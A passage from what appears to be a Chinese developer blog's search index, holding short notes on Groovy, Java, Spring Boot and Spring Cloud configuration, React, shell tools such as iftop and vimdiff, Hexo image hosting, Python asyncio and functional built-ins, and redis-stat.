sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.jetbrains.jps.incremental.groovy.InProcessGroovyc.runGroovycInThisProcess(InProcessGroovyc.java:158) at org.jetbrains.jps.incremental.groovy.InProcessGroovyc.lambda$runGroovyc$0(InProcessGroovyc.java:88) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) 根据上面的提示，说的是数组越界，只支持255个长度，结果有388个参数，然而蛋疼的是上面的堆栈信息中，可供参考的真心不多，也看不出什么原因 通过这篇文章才算知道原因 groovy数组长度支持最大数字限制255 看标题也就知道了，在Groovy脚本中，不能有数组的长度超过255，然后开始蛋疼的监测写的Groovy脚本，是不是有数组的赋值超过了上限，果不其然…. 特此记录下，这个蛋疼的问题 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/07/180907-IDEA编译Groovy脚本失败记录/"},{"title":"180911-获取应用中所有线程","text":"如何获取应用中，所有活动的线程？ 1234ThreadGroup group = Thread.currentThread().getThreadGroup();// 激活的线程数加倍int estimatedSize = group.activeCount() * 2;Thread[] slackList = new Thread[estimatedSize]; 上面是获取当前线程所在的ThreadGroup, 然后将这个分组内的所有线程丢到slackList数组中，实际测试时，数组大小可能是大于实际的线程数的（而且可能性特别大） 通过ThreadGroup，还可以获取上一层的Group, 然后遍历所有的线程 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/11/180911-获取应用中所有线程/"},{"title":"180915-ReactJs之Fix:uncaught at check call argument [object Promise] is not a function","text":"Fix uncaught at check call: argument [object Promise] is not a function在使用ANTD的魔板套前端页面的时候，遇到了一个诡异的问题，记录下 在modal中的写法如下 1234* addGroup({payload}, {call, put}) { yield call(addGroup(payload)); console.log(\"add group over!\");}, 在执行时，控制台报错 1uncaught at check call: argument [object Promise] is not a function 主要原因在 yield call(addGroup(payload)); 的使用姿势问题，对于需要传递参数的去哪个，不能直接这么干，应该改为 1yield call(addGroup, payload); II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/15/180915-ReactJs之Fix-uncaught-at-check-call-argument-object-Promise-is-not-a-function/"},{"title":"180906-Centos网络带宽监控小结","text":"Centos网络带宽监控小结查看机器的网络流入流出带宽，一个简单的方式就是利用 iftop ,下面简单的记录下使用姿势 I. 详情1. 安装依赖12345## 首先确认是否已经安装which iftop## 安装sudo yum install iftop -y 2. 使用安装完毕之后，使用也比较简单，首先找出需要监控的网卡 1ifconfig 其次就是监控网卡的流入流出 1iftop -i eth0 运行后截图如下 参数说明 12345678&quot;&lt;=&quot;与&quot;=&gt;&quot;，表示的是流量的方向&quot;TX&quot;：从网卡发出的流量&quot;RX&quot;：网卡接收流量&quot;TOTAL&quot;：网卡发送接收总流量&quot;cum&quot;：iftop开始运行到当前时间点的总流量&quot;peak&quot;：网卡流量峰值&quot;rates&quot;：分别表示最近2s、10s、40s 的平均流量 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/06/180906-Centos网络带宽监控小结/"},{"title":"180905-Spring返回Json对象","text":"Spring之返回Json串使用Spring搭建的web后端服务，与前端通过Json串进行交互，特此记录下使用姿势 1. 直接返回JsonString这个可以说是最简单和最常见的一种使用姿势了，直接返回String，如下 12345@ResponseBody@RequestMapping(value = \"/body\")public String body(@RequestBody Req req) { return JSON.toJSONString(req);} 2. 使用JsonInclude注解直接返回的是一个对象，然后交给框架来将对象转换为String丢给前端 12345@RequestMapping(path = {\"/index\", \"/\"})public ResponseWrapper&lt;List&lt;PoetryDTO&gt;&gt; index() { List&lt;PoetryDTO&gt; ans = poetryReadService.getIndex(); return ResponseWrapper.successReturn(ans);} 直接用上面的方式时，可能会抛出，提示没有对应的HttpMessageConverter来转换ResponseWrapper对象 一个简单的使用姿势就是直接使用注解 com.fasterxml.jackson.annotation.JsonInclude 如下即可 12345678910111213141516171819202122JsonInclude@Data@NoArgsConstructorpublic class ResponseWrapper&lt;T&gt; { private int code; private String msg; private T data; public ResponseWrapper(int code, String msg, T data) { this.code = code; this.msg = msg; this.data = data; } public static &lt;T&gt; ResponseWrapper&lt;T&gt; buildSuccess(T data) { return new ResponseWrapper&lt;&gt;(200, \"success\", data); } public static &lt;T&gt; ResponseWrapper&lt;T&gt; buildError(int code, String msg, T data) { return new ResponseWrapper&lt;&gt;(code, msg, data); }} 因此关键就是HttpMessageConverter在起作用了，下一篇重点关注下这个是什么东西，干嘛用，以及如何自己实现一个特定需求的转换器 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/05/180905-Spring返回Json对象/"},{"title":"180910-Java根据路径获取文件内容","text":"给出一个资源路径，然后获取资源文件的信息，可以说是非常常见的一种需求场景了，当然划分一下，本文针对最常见的三种状况进行分析 网络地址 本地绝对路径 本地相对路径 I. 实现1. 思路http or no-http 给出一个String表示资源文件的标识，如何判断是网络的文件还是本地的文件？ http开头的看成是网络文件 否则看做是本地文件 abs or relaitve 对于mac和linux系统而言，就比较简单了 以 “/“ 和 “~” 开头的表示绝对路径 其他的看做是相对路径 对于windows系统而言，绝对路径形如 “c:\\test.txt” 路径中包含 “:” 看成是绝对路径 （文件名中能否有:?) 以 “\\” 开头看做是绝对路径 2. 实现操作系统判断 123456789101112131415/** * 是否windows系统 */public static boolean isWinOS() { boolean isWinOS = false; try { String osName = System.getProperty(\"os.name\").toLowerCase(); String sharpOsName = osName.replaceAll(\"windows\", \"{windows}\").replaceAll(\"^win([^a-z])\", \"{windows}$1\") .replaceAll(\"([^a-z])win([^a-z])\", \"$1{windows}$2\"); isWinOS = sharpOsName.contains(\"{windows}\"); } catch (Exception e) { e.printStackTrace(); } return isWinOS;} 绝对路径与否判断 1234567891011121314151617181920public static boolean isAbsFile(String fileName) { if (OSUtil.isWinOS()) { // windows 操作系统时，绝对地址形如 c:\\descktop return fileName.contains(\":\") || fileName.startsWith(\"\\\\\"); } else { // mac or linux return fileName.startsWith(\"/\"); }}/** * 将用户目录下地址~/xxx 转换为绝对地址 * * @param path * @return */public static String parseHomeDir2AbsDir(String path) { String homeDir = System.getProperties().getProperty(\"user.home\"); return StringUtils.replace(path, \"~\", homeDir);} 文件获取封装类 1234567891011121314151617181920public static InputStream getStreamByFileName(String fileName) throws IOException { if (fileName == null) { throw new IllegalArgumentException(\"fileName should not be null!\"); } if (fileName.startsWith(\"http\")) { // 网络地址 return HttpUtil.downFile(fileName); } else if (BasicFileUtil.isAbsFile(fileName)) { // 绝对路径 Path path = Paths.get(fileName); return Files.newInputStream(path); } else if (fileName.startsWith(\"~\")) { // 用户目录下的绝对路径文件 fileName = BasicFileUtil.parseHomeDir2AbsDir(fileName); return Files.newInputStream(Paths.get(fileName)); } else { // 相对路径 return FileReadUtil.class.getClassLoader().getResourceAsStream(fileName); }} 3. 说明木有window操作系统，因此mac和linux已测试，window环境下是否ok，有待验证 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/10/180910-Java根据路径获取文件内容/"},{"title":"180930-Vimdiff实现文件对比","text":"linux下文件对比的利器，vimdiff，使用说明如下 实用的vim下比较两个文件命令： 1、 vimdiff file1 file2终端下输入该命令进入vim，垂直分隔窗口进行比较 2、 vimdiff -o file1 file2水平分隔窗口进行比较 3、 ctrl+w (j,k,h,l)上下左右切换光标所在的窗口（括号中表示可以是其中之一，按下ctrl+w，放开ctrl再按j,k,h,l） 4、 ctrl+w (J,K,H,L)上下左右移动光标所在窗口的位置 5、 zo 和 zc打开折叠区 和 关闭折叠区 6、 ]c 和 [c将光标移动到下一个不同区 和 上一个不同区 7、 do 和 dp将光标所在不同区域同步为另一个文件该位置的内容 和 将光标所在不同区域内容同步到另一个文件该位置 8、 :diffu[!]vim下更新当前比较窗口，比较状态下修改文件后，可调用该命令[中括号不为命令部分，如果加!表示如果外部修改了文件，则重新加载比较] 9、 :diffo[!]vim下关闭当前窗口比较状态，如果加!则关闭所有窗口的比较状态 10、:diffs file1vim下加入file1和当前光标所在窗口进行比较，水平分隔窗口 11、:vert diffs file1vim下加入file1和当前光标所在窗口进行比较，垂直分隔窗口 12、:difftvim下将光标所在窗口变为比较窗口 其它技巧： 1、 diff -u file1 file2 &gt; file3终端下输入该命令，可以将file1和file2的比较结果输出到file3中，-u 表示以合并格式比较，-c 为上下文格式，不加为一般格式 II. 其他参考 vimdiff比较两个文件 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/30/180930-Vimdiff实现文件对比/"},{"title":"180926-Java之数值型的字面值中使用下划线","text":"之前偶然在一个开源项目中看到下面这种写法，深感惊奇，当时没有记录，后来果不其然就忘掉了这种写法，现在又看到这种写法，特此记录 1long price = 1_000_123L; I. Java7新特性之数字中使用下划线为了直观性而言，在大数之间，加上下划线用于肉眼区分，下面实例小结下用法 1234567891011121314151617181920212223float pi1 = 3_.1415F; // 无效的; 不能在小数点之前有下划线float pi2 = 3._1415F; // 无效的; 不能在小数点之后有下划线long socialSecurityNumber1 = 999_99_9999_L; //无效的，不能在L下标之前加下划线int a1 = _52; // 这是一个下划线开头的标识符，不是个数字int a2 = 5_2; // 有效int a3 = 52_; // 无效的，不能以下划线结尾int a4 = 5_______2; // 有效的int a5 = 0_x52; // 无效，不能在0x之间有下划线int a6 = 0x_52; // 无效的，不能在数字开头有下划线int a7 = 0x5_2; // 有效的 (16进制数字)int a8 = 0x52_; // 无效的，不能以下划线结尾int a9 = 0_52; // 有效的（8进制数）int a10 = 05_2; // 有效的（8进制数）int a11 = 052_; // 无效的，不能以下划线结尾long creditCardNumber = 6684_5678_9012_3456l;long socialSecurityNumber = 333_99_9999l; float pi = 3.14_15F;long hexBytes = 0xFF_EC_DE_5E;long hexWords = 0xCAFE_BABE;long maxLong = 0x7fff_ffff_ffff_ffffL;byte nybbles = 0b0010_0101;long bytes = 0b11010010_01101001_10010100_10010010; 简单来说，就是在数中间，插上下划线，用于划分段落 II. 其他0. 参考 Java SE7新特性之在数值型的字面值中使用下划线 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/26/180926-Java之数值型的字面值中使用下划线/"},{"title":"180916-ReactJs之日期转换","text":"常见的日期与时间戳之间的相互转换，记录下借助插件momoent来实现 1. 使用姿势使用前，有那么几步需要走 安装依赖 1sudo npm install --save moment 引入依赖 1import moment from 'moment'; 开始使用 12// 将时间戳(ms)，转换为指定格式的日期moment(Time).format(\"YYYY-MM-DD HH:mm:ss\") 2. 常用说明a. 日期格式化12345moment().format('MMMM Do YYYY, h:mm:ss a'); // 九月 16日 2018, 8:54:12 晚上moment().format('dddd'); // 星期日moment().format(\"MMM Do YY\"); // 9月 16日 18moment().format('YYYY [escaped] YYYY'); // 2018 escaped 2018moment().format(); // 2018-09-16T20:54:12+08:00 b. 相对时间12345moment(\"20111031\", \"YYYYMMDD\").fromNow(); // 7 年前moment(\"20120620\", \"YYYYMMDD\").fromNow(); // 6 年前moment().startOf('day').fromNow(); // 21 小时前moment().endOf('day').fromNow(); // 3 小时内moment().startOf('hour').fromNow(); // 1 小时前 c. 日历时间12345678moment().subtract(10, 'days').calendar(); // 2018年9月6日moment().subtract(6, 'days').calendar(); // 本周一晚上8点55moment().subtract(3, 'days').calendar(); // 本周四晚上8点55moment().subtract(1, 'days').calendar(); // 昨天晚上8点55分moment().calendar(); // 今天晚上8点55分moment().add(1, 'days').calendar(); // 明天晚上8点55分moment().add(3, 'days').calendar(); // 下周三晚上8点55moment().add(10, 'days').calendar(); // 2018年9月26日 d. 多语言12345678moment().format('L'); // 2018-09-16moment().format('l'); // 2018-09-16moment().format('LL'); // 2018年9月16日moment().format('ll'); // 2018年9月16日moment().format('LLL'); // 2018年9月16日晚上8点55分moment().format('lll'); // 2018年9月16日晚上8点55分moment().format('LLLL'); // 2018年9月16日星期日晚上8点55分moment().format('llll'); // 2018年9月16日星期日晚上8点55分 II. 其他0. 相关 moment.js官网 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/16/180916-ReactJs之日期转换/"},{"title":"180928-hexo使用本地图片的一种方式","text":"hexo搭建的个人博客中，想引入图片可以怎么搞？ 整个过程中，尝试过一些方法，下面记录一下，并给出现在正使用的方式 I. Hexo图片引用1. 外网图片这种没啥好说的，就是直接引用网上已经存在了的图片，直接把地址捞过来，然后利用markdown的语法引入即可 2. 自己的图片自己的图片，没有外网地址咋办？ 自然而然想到的办法是找一个可以传图的第三方网站，传上去，获取图片地址来使用，然后我就用过开源中国，简书，掘进，蘑菇街的图片上传，但是这些网站可能对图片的referer进行了校验，所以用着用着，哪天就变成了个无权限的默认图 3. 七牛七牛云有免费的存储空间，可以用来传自己的图片，没用过，不多说 4. Github用github来存储图片，然后引用即可😏，而且以Github还可以对这些图片进行版本管理，既当了图床，又可以查找历史，简直点赞，通常github引用图片的路径如下 1https://raw.githubusercontent.com/liuyueyi/Source/master/img/info/blogInfoV2.png 没错，文末的两张图片就是存在github中的😝 5. hexo本地图片直接用hexo来管理本地图片，网上一查，还真有这种姿势，开启_config.yml中的post_asset_folder: true 参数，然后再你的博文生成一个同名的目录，把图片放进去，然后以如下方式引用 1![](博文目录/图片.jpg) 然而，但是，最终我没有用这个，两个原因 每个博文都配一个同名目录，看着不爽啊 因为我的博客网站默认加了root参数，即域名后都会跟一个一级目录，用上面的方式会读不到图片，也没查到解决方法，所以就pass掉了 虽然没有直接这么用，但是思路就打开了，hexo最终生成静态的网页，那么直接把图片放在某个固定的目录下，最终生成的网页可以链接到这些图片不就好了么 因此实现方式就有了 在source目录下新建一个目录名为imgs imgs目录下存放所有的图片，为方便起见，约束imgs目录下图片存放规则为 以博文创建的日期为目录名，如 180928 将图片以 00 - xx 依次命名，放在上面的目录中 引入图片形如: ![](/hexblog/imgs/180928/00.png) 下图为实际的结果 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/28/180928-hexo使用本地图片的一种方式/"},{"title":"181112-springboot应用下线配置","text":"本篇记录SpringBoot 2.x借助Actuator实现优雅的下线的配置方式 I. 配置1. 背景目前网络上搜索SpringBoot应用下线的博文，大部分都是基于1.x的配置方式，通过修改配置参数 1234#启用shutdownendpoints.shutdown.enabled=true#禁用密码验证endpoints.shutdown.sensitive=false 然而在2.x，上面这个配置已经被废弃了，直接如上面配置是不行的，因此记录下2.x的正确配置方式 2. 基本配置首先需要添加actuator依赖，然后借助它提供的服务来做相关的工作 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 其次就是在配置中，开启关闭的配置项 1234management: endpoint: shutdown: enabled: true 然后当需要关闭应用时，使用POST命令执行 1curl -X POST 'http://127.0.0.1:8088/actuator/shutdown' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/12/181112-springboot应用下线配置/"},{"title":"180925-shell获取系统当前时间并格式化","text":"shell命令获取当前系统时间并格式化的方式记录 12time=$(date \"+%Y-%m-%d %H:%M:%S\")echo \"${time}\" 说明 date后面有一个空格，否则无法识别命令， Y显示4位年份，如：2018；y显示2位年份，如：18。 m表示月份； M表示分钟。 d表示天，而D则表示当前日期， 如：1/18/18(也就是2018.1.18)。 H表示小时，而h显示月份。 s显示当前秒钟，单位为毫秒；S显示当前秒钟，单位为秒。 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/25/180925-shell获取系统当前时间并格式化/"},{"title":"181011-SpringCloud之DiscoverClient无法获取Service记录","text":"最终解决问题之后，才发现是自己走进盲角了，花了不少时间，特此记录 I. 问题说明在测试使用SpringCloud全家桶时，服务向注册中心注册，然后client就可以相互之间实现RPC调用（其实还是http访问） 如果我想看看当前注册中心获取了哪些服务，可以怎么办？ 一个简单的方法就是借助DiscoverClient来做，然后问题就来了 1234public Application(DiscoveryClient discoveryClient) { List&lt;String&gt; list = discoveryClient.getServices(); System.out.println(list);} 上面的代码执行之后，发现返回是空数组；蛋疼的是换另外一个工程，同样的方式，却可以拿到注册的服务名 查了半天，最好才发现拿不到是因为在配置中添加了 1eureka.client.fetchRegistry=false 上面就表示不会去主动获取注册的服务，因此也就拿不到服务了；改成true之后就ok了 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/10/11/181011-SpringCloud之DiscoverClient无法获取Service记录/"},{"title":"181117-Python异步之asyncio","text":"本篇主要是asyncio这个包的使用，如何使用协程，以及协程和线程可以怎么配合使用，得到更加的使用效果 1. 定义协程通过 async 来定义协程，并将协程丢到事件循环中执行，常用套路如下 123456789101112131415161718import asyncioimport timenow = lambda: time.time()# 定义一个协程，丢到事件循环中执行async def do_some_job(x): print(\"do some : \", x) time.sleep(1)print(\"------- start coroutine ----------\")start = now()loop = asyncio.get_event_loop()loop.run_until_complete(do_some_job(2))print(\"end cost: \", now() - start) 说明 通过关键字async修饰函数，然后直接调用函数的方式，返回的就是一个协程coroutine 协程需要丢到事件循环中执行，通过 asyncio.get_event_loop() 获取事件循环 loop 执行协程 loop.run_until_complete(coroutine) 上面执行的输出如下 123------- start coroutine ----------do some : 2end cost: 1.0031189918518066 2. 返回结果上面的函数如果有返回结果，丢到事件循环中执行后，可以怎么获取返回呢？ case1：直接使用方式 直接获取loop.run_until_complete(xxx)返回即可，ans就是协程返回的value 123456789101112131415161718import asyncioimport timenow = lambda: time.time()# 定义一个协程，丢到事件循环中执行async def do_some_job(x): print(\"do some : \", x) time.sleep(1) return x * xprint(\"------- start coroutine ----------\")start = now()loop = asyncio.get_event_loop()ans = loop.run_until_complete(do_some_job(2))print(\"end cost: \", now() - start, ans) case2：使用任务 另外一种方式就是使用任务，任务还有一种更强的方式就是绑定回调函数，当协程处理完毕之后，将结果丢到回调函数中，继续执行某些操作 一个简单的case如下 123456789101112131415161718print(\"------- start callback ----------\")async def do_some_return_job(data): print('do return data: ', data) return data * 2def callback(future): print(\"do callback: \", future.result())# 创建一个task，并绑定返回结果的回调start = now()task = asyncio.ensure_future(do_some_return_job(3))task.add_done_callback(callback)ans = loop.run_until_complete(task)print(\"end callback cost: \", now() - start, ans) 这种使用场景也比较经典，步骤如下 使用asyncio.ensure_future(coroutine)来创建一个task任务 为task任务绑定回调task.add_done_callback(callback) 将task丢到事件回调中执行 3. 多任务执行前面两个只能算是演示使用协程的方式，但实际上因为只有一个task，所以并不能体现协程的并行优势；下面开始演示下多个任务的情况 在这种场景下，我们执行的任务加一个耗时的等待，模拟让出cpu给其他线程执行的case 1234567891011121314151617181920212223242526# 函数内部通过调用 `asyncio.sleep(1)` + `await` 来表示现在执行耗时的操作了，让出cpuasync def do_some_wait_job(data): print(\"do wait job:\", data) await asyncio.sleep(1) return data * 2print(\"------- start 多任务并行 ---------\")start = now()tasks = [ asyncio.ensure_future(do_some_wait_job(2)), asyncio.ensure_future(do_some_wait_job(3)), asyncio.ensure_future(do_some_wait_job(4)),]# await方式，返回的结果通过task进行获取# loop.run_until_complete(asyncio.wait(tasks))# for task in tasks:# print('task return : ', task.result())# print(\"multi task cost : \", now() - start)# gather 方式直接获取返回的结果start = now()ans = loop.run_until_complete(asyncio.gather(*tasks))for v in ans: print('gather task return: ', v)print(\"multi2 task cost : \", now() - start) 多个任务执行中，首先当然也是创建task任务列表，然后将所有的任务列表丢到事件循环中即可 定义task列表 [ asyncio.ensure_futre(xxx)...] 执行所有的任务 loop.run_until_complete(asyncio.wait(tasks)) 获取任务返回的结果就需要通过task#result来获取 loop.run_until_complete(asyncio.gather(*tasks)) 直接返回任务执行的结果 上面代码执行之后输出如下 12345678------- start 多任务并行 ---------do wait job: 2do wait job: 3do wait job: 4gather task return: 4gather task return: 6gather task return: 8multi2 task cost : 1.0029327869415283 根据上面的输出结果，可以看到三个任务总共执行1s多一点，如果串行那么最少要3s 4. 线程+协程使用我们考虑将定义的协程任务放在一个子线程中执行，然后主线程就负责往子线程中注册协程，这样就可以实现子线程负责干活，主线程则负责分配任务的功能，这种case可以如何处理呢？ 1234567891011121314151617181920212223242526272829303132333435363738import asyncioimport threadingimport time'''主线程中创建一个new_loop，然后在另外的子线程中开启一个无限事件循环然后在主线程中通过`run_coroutine_threadsafe`来注册协程对象，子线程运行时间循环，主线程也不会被阻塞'''def start_loop(loop): asyncio.set_event_loop(loop) loop.run_forever()async def do_some_work(x): print(\"do some work: \", x) await asyncio.sleep(1) print(\"do next work: \", x) return x * xnow = lambda: time.time()new_loop = asyncio.new_event_loop()# 创建线程，在线程中开启事件循环t = threading.Thread(target=start_loop, args=(new_loop,), name='loopThread')t.start()start = now()result = asyncio.run_coroutine_threadsafe(do_some_work(3), new_loop)print(\"haha----&gt;\", now() - start, result)result = asyncio.run_coroutine_threadsafe(do_some_work(4), new_loop)print(\"haha----&gt;\", now() - start)print(\"end\", now(), ' cost ', now() - start, result.result()) 上面需要注意的几点是 创建一个新的事件循环, asyncio.new_event_loop() 主线程注册协程的逻辑 asyncio.run_coroutine_threadsafe(do_some_work(4), new_loop), 两个参数，第一个为协程，第二个为前面创建的时间循环 如果需要获取返回的结果，则根据返回的 result() 函数来get II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/17/181117-Python异步之asyncio/"},{"title":"181119-Redis性能监控之Redis-Stat","text":"redis性能监控工具使用 redis-stat 进行redis的性能监控数据收集 1. 安装这个工程主要是ruby进行开发的，所以需要准备对应的环境 1234567# ruby环境相关yum install rubyyum install ruby-develyum install rubygems# 基本环境yum install gcc gcc-c++ 编译安装 1gem install redis-stat 2. 使用控制台使用 每1s采集一次，总共显示10条 1redis-stat -a pwd localhost:6380 1 10 web使用 1redis-stat --verbose --server=8080 5 实际截图如下 3. 源码 https://github.com/junegunn/redis-stat II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/19/181119-Redis性能监控之Redis-Stat/"},{"title":"181116-Python函数特性","text":"本篇博文主要介绍一些高级的函数特性，如map,reduce,filter,sort,装饰器,lambda等 1. map这个map是指map/reduce中的map，而不是类似jdk的map数据结构 在python中，map接收两个参数，第一个为函数，第二个为一个可迭代的对象，作用是顺序的将迭代器中的元素丢给函数执行，并将结果作为新的Iterator返回 如将列表中的每个数求平方 12345678910# 列表生成式的写法&gt;&gt;&gt; [ x*x for x in range(1,6)][1, 4, 9, 16, 25]# 使用map的方法&gt;&gt;&gt; def f(x):... return x * x... &gt;&gt;&gt; list(map(f, range(1,6)))[1, 4, 9, 16, 25] 上面这样对比之后，发现列表生成式的写法更加简洁，并不能凸显map的优越性 换一个例子，将奇数采用*2，偶数采用平方的方式，则用列表生成式不太好写了 12345678&gt;&gt;&gt; def f(x):... if(x % 2==0) :... return x * x... else:... return x *2 ... &gt;&gt;&gt; list(map(f, range(1,6)))[2, 4, 6, 16, 10] 2. reducemap相当于是顺序的执行迭代器中的元素；而reduce则是每个元素执行完毕之后，会与下一个元素一起进行计算，最终返回的是函数最终的计算结果 一个典型的case如，获取列表中元素的和 1234567# 首先是导入依赖&gt;&gt;&gt; from functools import reduce&gt;&gt;&gt; def f(x, y):... return x + y... &gt;&gt;&gt; reduce(f, range(1, 100))4950 需要额外注意的是使用reduce需要引入对应的包 3. filter过滤，同样接收两个参数，第一个为过滤函数（返回True/False，True表示保留）；第二个为可迭代的对象 如过滤数组中的所有偶数，只保留奇数 12345&gt;&gt;&gt; def f(s):... return s % 2 == 1... &gt;&gt;&gt; list(filter(f, range(1, 10)))[1, 3, 5, 7, 9] 4. sortedsorted函数可以实现针对列表的排序，也可以接收一个key函数来实现自定义的排序，如按照绝对值大小进行排序 123&gt;&gt;&gt; l=[36, 5, -12, 9, -21]&gt;&gt;&gt; sorted(l, key=abs)[5, 9, -12, -21, 36] 5. 匿名函数 lambda使用lambda来修饰匿名函数，一般就是一个表达式，配合map/reduce等函数使用时，可能会非常简洁 语法 lambda 参数: 执行逻辑 如针对列表中，每个数求平方后得出新的列表 12&gt;&gt;&gt; list(map(lambda x: x*x, range(1, 5)))[1, 4, 9, 16] 将前面的求和进行改造 12&gt;&gt;&gt; reduce(lambda x,y:x+y, range(1, 100))4950 6. 装饰器在python中这个装饰器的概念更加类似java中的代理模式，可以增强函数的某些操作，在实际使用中，和我们通常说的切面比较像 因为在python中函数可以作为变量来传参使用，因此装饰器模式的实质就是包装一下需要执行的方法，然后在这个方法执行前后做一些事情 实例1： 